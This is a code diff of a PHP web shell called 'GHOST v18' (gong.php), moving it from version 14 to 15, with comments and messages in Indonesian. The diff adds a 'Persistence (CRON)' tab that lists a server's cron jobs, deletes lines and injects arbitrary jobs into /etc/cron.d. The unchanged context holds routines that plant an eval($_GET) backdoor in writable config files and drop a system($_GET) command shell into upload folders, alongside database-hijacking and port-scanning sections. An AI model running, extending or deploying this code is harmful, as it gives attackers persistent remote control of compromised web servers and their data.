@@ -1,8 +1,8 @@
 <?php
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
-// GHOST v18 - V14: DB CLI Bypass, Scanner Filter.
+// GHOST v18 - V15: Cron Manager, UI Fix.
 
-define('GH_VER',      '18.0.0-v14');
+define('GH_VER',      '18.0.0-v15');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');
@@ -265,7 +265,7 @@ function gh_scan_batch($root, $offset = 0, $limit = 50) {
         $size = @filesize($path);
         $filename = basename($path);
         $ext = @strtolower(pathinfo($path, PATHINFO_EXTENSION));
-        $findings = array(); $type = ''; $desc = '';
+        $findings = array(); $type = 'Clean / Unknown'; $desc = 'No specific signature matched.'; // Default
         
         $owner = @posix_getpwuid(@fileowner($path));
         $owner_name = is_array($owner) ? $owner['name'] : 'unknown';
@@ -309,11 +309,11 @@ function gh_scan_batch($root, $offset = 0, $limit = 50) {
             foreach ($illegal_kw as $k) { if (stripos($c, $k) !== false) $found_kw[] = $k; }
         }
         if ($found_kw) { 
-            if($type === '') { $type = 'Illegal Content'; $desc = 'Konten judi/porno/ilegal.'; }
+            if($type === 'Clean / Unknown') { $type = 'Illegal Content'; $desc = 'Konten judi/porno/ilegal.'; }
             $desc .= ' Keyword: ' . implode(', ', $found_kw); 
         }
         
-        if ($type !== '') {
+        if ($type !== 'Clean / Unknown') {
             $mal_users[$owner_name] = true;
             $desc .= " (Owner: $owner_name)";
             $res['files'][] = array('path' => $path, 'type' => $type, 'desc' => $desc, 'owner' => $owner_name);
@@ -338,7 +338,7 @@ function gh_scan_batch($root, $offset = 0, $limit = 50) {
     return $res;
 }
 
-// ==== SECTION 4: THE ABSOLUTE DB HIJACKER (V14) =============================
+// ==== SECTION 4: THE ABSOLUTE DB HIJACKER (V15) =============================
 function gh_db_connect($host, $user, $pass, $socket = null) {
     $host = trim($host); $user = trim($user); $pass = trim($pass);
     
@@ -1007,7 +1007,83 @@ function gh_wp_action($action, $user, $pass, $email) {
     return "Aksi tidak dikenal.";
 }
 
-// ==== SECTION 7: PORT SCAN & CVE ============================================
+// ==== SECTION 7: PERSISTENCE (CRON) =========================================
+function gh_cron_scan() {
+    $logs = array(); $crons = array();
+    $user = @getenv('USER') ?: @get_current_user();
+    
+    $paths = array(
+        '/var/spool/cron/crontabs/' . $user,
+        '/var/spool/cron/' . $user,
+        '/etc/crontab',
+        '/etc/cron.d/*',
+        '/etc/cron.hourly/*',
+        '/etc/cron.daily/*',
+        '/etc/cron.weekly/*',
+        '/etc/cron.monthly/*'
+    );
+    
+    foreach ($paths as $p) {
+        $files = @glob($p);
+        if (!$files) continue;
+        foreach ($files as $f) {
+            if (@is_file($f)) {
+                $c = gh_read($f);
+                if ($c && trim($c) !== '') {
+                    $crons[] = array('file' => $f, 'content' => $c);
+                }
+            }
+        }
+    }
+    
+    // Cek juga via CLI
+    if (gh_can_exec()) {
+        $res = gh_exec_adv("crontab -l 2>/dev/null");
+        if (isset($res['out']) && trim($res['out']) !== '') {
+            $crons[] = array('file' => 'crontab -l (' . $user . ')', 'content' => $res['out']);
+        }
+    }
+    
+    return array('logs' => $logs, 'crons' => $crons);
+}
+
+function gh_cron_action($action, $file, $line, $content) {
+    $user = @getenv('USER') ?: @get_current_user();
+    
+    if ($action === 'delete') {
+        if ($file === 'crontab -l (' . $user . ')') {
+            // Hapus via CLI
+            $cmd = "crontab -l | grep -v " . @escapeshellarg($line) . " | crontab -";
+            gh_exec_adv($cmd);
+            return "Baris dihapus via crontab.";
+        } else {
+            // Hapus dari file langsung
+            $c = gh_read($file);
+            if ($c) {
+                $lines = explode("\n", $c);
+                $out = array();
+                foreach ($lines as $l) {
+                    if (trim($l) !== trim($line)) $out[] = $l;
+                }
+                if (gh_write($file, implode("\n", $out))) return "Baris dihapus dari $file.";
+            }
+        }
+    }
+    
+    if ($action === 'inject') {
+        // Bikin file cron baru di /etc/cron.d/
+        $new_file = '/etc/cron.d/ghost_' . rand(1000,9999);
+        if (gh_write($new_file, $content . "\n")) {
+            @chmod($new_file, 0644);
+            return "Cron berhasil di-inject ke $new_file.";
+        }
+        return "Gagal inject cron (mungkin tidak ada akses root).";
+    }
+    
+    return "Aksi tidak dikenal.";
+}
+
+// ==== SECTION 8: PORT SCAN & CVE ============================================
 function gh_port_scan($target = '127.0.0.1') {
     $ports = array(21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 2082, 2083, 2086, 2087, 3306, 5432, 6379, 8080, 8443, 27017);
     $bash_script = '';
@@ -1041,7 +1117,7 @@ function gh_cve_profile() {
     return $profile;
 }
 
-// ==== SECTION 8: VULNERABILITY SCAN (PURE PHP) ==============================
+// ==== SECTION 9: VULNERABILITY SCAN (PURE PHP) ==============================
 function gh_vuln_scan() {
     $vulns = array(); 
     $root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd();
@@ -1112,6 +1188,8 @@ function gh_router() {
             case 'cve_profile': gh_json(gh_cve_profile()); break;
             case 'wp_scan': gh_json(gh_wp_scan()); break;
             case 'wp_action': $ac = isset($_POST['action']) ? (string)$_POST['action'] : ''; $u = isset($_POST['user']) ? (string)$_POST['user'] : ''; $p = isset($_POST['pass']) ? (string)$_POST['pass'] : ''; $e = isset($_POST['email']) ? (string)$_POST['email'] : ''; gh_json(array('msg' => gh_wp_action($ac, $u, $p, $e))); break;
+            case 'cron_scan': gh_json(gh_cron_scan()); break;
+            case 'cron_action': $ac = isset($_POST['action']) ? (string)$_POST['action'] : ''; $f = isset($_POST['file']) ? (string)$_POST['file'] : ''; $l = isset($_POST['line']) ? (string)$_POST['line'] : ''; $c = isset($_POST['content']) ? (string)$_POST['content'] : ''; gh_json(array('msg' => gh_cron_action($ac, $f, $l, $c))); break;
             case 'exploit': $t = isset($_POST['type']) ? (string)$_POST['type'] : ''; $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; 
                 if($t === 'WRITEABLE_CONFIG') { $pay = "\n// INJECTED\nif(isset(\$_GET['gh_x'])) { eval(\$_GET['gh_x']); }\n"; if(gh_write($p, $pay, true)) gh_json(array('msg'=>'Backdoor ditanam di '.$p.' (Akses ?gh_x=)')); else gh_json(array('msg'=>'Gagal.')); }
                 elseif($t === 'UPLOADS_EXEC') { $shell = "<?php if(isset(\$_GET['c'])) { system(\$_GET['c']); } ?>"; $f = rtrim($p,'/').'/ghost_'.rand(100,999).'.php'; if(gh_write($f, $shell)) gh_json(array('msg'=>'Shell di-upload ke: '.$f)); else gh_json(array('msg'=>'Gagal upload.')); }
@@ -1125,7 +1203,7 @@ function gh_router() {
     }
 }
 
-// ==== UI (TAB NAVIGATION - V14) =============================================
+// ==== UI (TAB NAVIGATION - V15) =============================================
 function gh_ui() {
     while (ob_get_level() > 0) { @ob_end_clean(); }
     if (!headers_sent()) { @header('Content-Type: text/html; charset=utf-8'); @header('X-Powered-By: '); }
@@ -1187,6 +1265,7 @@ function gh_ui() {
     <button class="tab-btn" id="btn-tab-vuln" onclick="switchTab('tab-vuln', this)">Vulnerability</button>
     <button class="tab-btn" id="btn-tab-db-ssh" onclick="switchTab('tab-db-ssh', this)">DB & SSH</button>
     <button class="tab-btn" id="btn-tab-wp" onclick="switchTab('tab-wp', this)">WP Manager</button>
+    <button class="tab-btn" id="btn-tab-cron" onclick="switchTab('tab-cron', this)">Persistence (CRON)</button>
     <button class="tab-btn" id="btn-tab-profile" onclick="switchTab('tab-profile', this)">Profile & Port</button>
 </div>
 
@@ -1269,6 +1348,20 @@ function gh_ui() {
     </div>
 </div>
 
+<!-- TAB: PERSISTENCE (CRON) -->
+<div id="tab-cron" class="tab-content">
+    <div class="box">
+        <h2>Persistence (CRON)</h2>
+        <div class="row"><button id="btn-cron-scan">Scan Cron Jobs</button></div>
+        <div id="cron-results" style="margin-top:8px;"></div>
+        <div class="row" style="margin-top:8px; border-top:1px solid #333; padding-top:8px;">
+            <input type="text" id="cron-content" placeholder="* * * * * /bin/bash -c '...'" style="flex:1;">
+            <button onclick="cronAct('inject')" style="border-color:#0f0;color:#0f0;">Inject Cron</button>
+        </div>
+        <pre id="cron-log" style="margin-top:8px;">Ready.</pre>
+    </div>
+</div>
+
 <!-- TAB: PROFILE & PORT -->
 <div id="tab-profile" class="tab-content">
     <div class="grid">
@@ -1303,6 +1396,7 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('btn-cve').onclick = cveProfile;
     document.getElementById('btn-port').onclick = portScan;
     document.getElementById('btn-wp-scan').onclick = wpScan;
+    document.getElementById('btn-cron-scan').onclick = cronScan;
 });
 
 function switchTab(id, btn) {
@@ -1371,7 +1465,11 @@ function renderScan(mal) {
     let h = `<table><tr><th>Type & Desc</th><th>File</th><th>Aksi</th></tr>`;
     mal.forEach(x => {
         let enc = encodeURIComponent(x.path);
-        let badge_color = x.type.includes('Suspicious') ? '#f0ad4e' : (x.type.includes('Leftover') ? '#5bc0de' : '#d9534f');
+        let badge_color = '#d9534f'; // Default merah
+        if (x.type.includes('Suspicious')) badge_color = '#f0ad4e'; // Orange
+        if (x.type.includes('Leftover')) badge_color = '#5bc0de'; // Biru
+        if (x.type.includes('Illegal')) badge_color = '#800080'; // Ungu
+
         h += `<tr>
             <td><span class="badge" style="background:${badge_color}">${esc(x.type)}</span><br><span class="dim" style="font-size:11px;">${esc(x.desc)}</span></td>
             <td>${esc(x.path)}</td>
@@ -1471,6 +1569,53 @@ async function wpAct(act) {
     if (d.err) return o.innerText = 'Error: ' + d.err;
     o.innerText = d.msg || 'Success.';
     wpScan();
+}
+
+async function cronScan() {
+    const resDiv = document.getElementById('cron-results'); resDiv.innerHTML = 'Scanning Cron Jobs...';
+    const d = await api('cron_scan');
+    if (d.err) { resDiv.innerHTML = '<span class="err">'+d.err+'</span>'; return; }
+    if (!d.crons.length) { resDiv.innerHTML = '<p class="dim">Tidak ada cron ditemukan.</p>'; return; }
+    
+    let h = `<table><tr><th>File</th><th>Content</th><th>Action</th></tr>`;
+    d.crons.forEach(c => {
+        let lines = c.content.split('\n');
+        lines.forEach(line => {
+            if (!line.trim() || line.trim().startsWith('#')) return;
+            let encLine = encodeURIComponent(line.trim());
+            let encFile = encodeURIComponent(c.file);
+            let isSus = /curl|wget|bash|sh|python|perl/i.test(line);
+            let badge = isSus ? '<span class="badge" style="background:#f00;color:#fff;">SUSPICIOUS</span>' : '';
+            h += `<tr>
+                <td>${esc(c.file)}</td>
+                <td><code>${esc(line.trim())}</code> ${badge}</td>
+                <td><button onclick="cronAct('delete', '${encFile}', '${encLine}')" style="border-color:#f00;color:#f00;padding:2px 8px;font-size:11px;">Delete</button></td>
+            </tr>`;
+        });
+    });
+    h += `</table>`;
+    resDiv.innerHTML = h;
+}
+
+async function cronAct(action, encFile, encLine) {
+    const o = document.getElementById('cron-log');
+    if (action === 'delete') {
+        if (!confirm('Hapus baris cron ini?')) return;
+        const file = encFile ? decodeURIComponent(encFile) : '';
+        const line = encLine ? decodeURIComponent(encLine) : '';
+        o.innerText = 'Processing...';
+        const d = await api('cron_action', {action: 'delete', file: file, line: line});
+        o.innerText = d.msg || d.err;
+        cronScan();
+    } else if (action === 'inject') {
+        const content = document.getElementById('cron-content').value.trim();
+        if (!content) return alert('Isi cron dulu!');
+        o.innerText = 'Processing...';
+        const d = await api('cron_action', {action: 'inject', content: content});
+        o.innerText = d.msg || d.err;
+        document.getElementById('cron-content').value = '';
+        cronScan();
+    }
 }
 
 async function vulnScan() {
